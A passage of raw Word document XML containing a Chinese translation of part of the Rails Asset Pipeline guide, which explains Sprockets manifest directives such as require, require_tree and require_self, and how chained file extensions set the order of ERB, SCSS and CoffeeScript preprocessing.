      </w:r>
    </w:p>
    <w:p w14:paraId="1F1B266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例如，一个新的 Rails 应用程序包含了一个默认的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/assets/javascripts/application.js</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件，这个文件包含了一些行:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2640"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="456C0BE5" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6F9CD6D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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6EE9FFD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 jquery</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2209CFE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 jquery_ujs</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D78915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require_tree .</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5D113C0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 JavaScript 文件里，指令以 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>//=</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 开头。在这个例子里， 该文件使用了 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>require</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>require_tree</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指令。 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>require</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指令是用于告诉 Sprockets 需要加入的文件。这里，你加入了 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>jquery.js</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>jquery_ujs.js</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件，Sprockets 可以在搜索路径的某个地方找到。 你不需要显式的提供扩展名。当在一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>.js</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件里时，Sprockets 会假设你加入的是一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>.js</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7938278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 Rails 3.1 里， </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>jquery-rails</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> gem 通过 asset pipline 提供了 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>jquery.js</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>jquery_ujs.js</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件. 你会在应用程序的目录中看到它们。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A51BAE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require_tree</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指令告诉 Sprockets 递归地去包含在指定目录下_所有_ 的 JavaScript 文件到输出里。 这些路径必须在资源清单文件中有相关的指定。 有也可以使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>require_directory</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指令，它会将在某个特定目录下所有的 JavaScript 文件包含进去，但不递归。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C7C7E7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指令会从上到下进行处理， 但是通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>require_tree</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 包含进来的文件的顺序就没有规定。你不应该在它们中安排顺序。如果你想在连结起来的文件中确保某个 JavaScript 文件内容在其它之前结束， 先将首要的文件填入资源清单。 注意 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>require</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指令集会防止文件被重复包含到输出里。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F0D9FB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Rails 也会创建一个默认的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/assets/stylesheets/application.css</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件，包含以下内容：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2040"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="4E574FD1" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="08B5C1B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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3FD5823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require_self</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7CF05D2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require_tree .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C337D3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w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="069DDE8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 JavaScript 文件里可用的指令也可用于 stylesheets (当然是包含 stylesheets 文件而不是 JavaScript 文件). </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>require_tree</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指令在 CSS资源清单中的用法和在 JavaScript 的用法是一样的，就是加入当前目录下的所有 stylesheets 文件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="716F374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在这个例子中使用了 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>require_self</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。 这将文件中的 CSS (如果有) 放置到 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>require_self</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 调用的准确位置。如果 =require_self+ 被调用超过一次，只有最后一次调用有效。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52A7EB1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如果你像使用多个 Sass 文件，你通常可以使用 </w:t>
      </w:r>
      <w:hyperlink r:id="rId964" w:anchor="import" w:history="1">
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">Sass </w:t>
        </w:r>
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>@import</w:t>
        </w:r>
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve"> rule</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 替代这些 Sprockets 指令。使用 Sprockets 指令的话，所有在 Sass 文件中定义的变量和 mixins 都只能在其被定义的文档中可用.(译者注: 虽然连结成同一个文件，但定义的变量等是相对独立的。而用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>@import</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的话则可以在所有关联的 Sass 文件中通用.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EF2C4F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你可以有和你需要的一样多的资源清单文件。例如 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>admin.css</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>admin.js</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>资源清单可以包括被用于应用程序管理部分的 JS 和 CSS 文件.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="127B425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排序方式和前面提到的一样。特殊情况下， 你可以指定独立的文件然后它们就会被按照指定的顺序编译。例如，你会通过这个方法连结三个 CSS 文件：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2040"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="6EBD040D" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1DAD2B8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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="176B695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 reset</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0EB4977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 layout</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4123121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 chrome</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="797A954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w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="64516952"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2.4 预处理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22425FB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文件的扩展名被用于判断某个资源文件要进入哪个预处理过程。当一个控制器或者一个 scaffold 是由 Rails 默认的 gemset 生成时， CoffeeScript 文件和 SCSS 文件会代替常规的 JavaScript 和 CSS 文件被生成。 前面的使用过例子的控制器为 "projects"，则它会生成一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/assets/javascripts/projects.js.coffee</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/assets/stylesheets/project.css.scss</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="675E725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当这些文件被请求时，它们会分别被 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>coffee-script</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>sass</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> gem 提供的处理器处理，然后编译好的 JavaScript 和 CSS 文件送回给浏览。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D54D69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其它层的预处理可以通过添加其它的扩展被加入，扩展的处理顺序按是从右到左。这应该用于需要按顺序处理的过程。例如，一个名为 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/assets/stylesheets/project.css.scss.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的式样文件是被当作 ERB 处理，然后是 SCSS，最后为 CSS。对应用到 JavaScript 文件也是同样的 — </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/assets/javascript/projects.js.coffee.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 显示作为 ERB, 然后是 CoffeScript, 接着就是 JavaScript了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AB9ED3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谨记这些处理器的顺序是很重要的。例如，如果调用你的 JavaScript 文件 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/assets/javascripts/projects.js.erb.coffee</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>， 那么现由 CoffeeScript 拦截器先处理。它不能解析 ERB 所以你会碰到问题。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39CD7ECA"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3 在开发中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B85ED3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在开发环境中，资源文件按照在资源清单文件中的指定顺序以单独文件方式被供应。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BEB1F8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这个资源清单</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/assets/javascript/application.js</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">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2400"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="3522FDEA" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
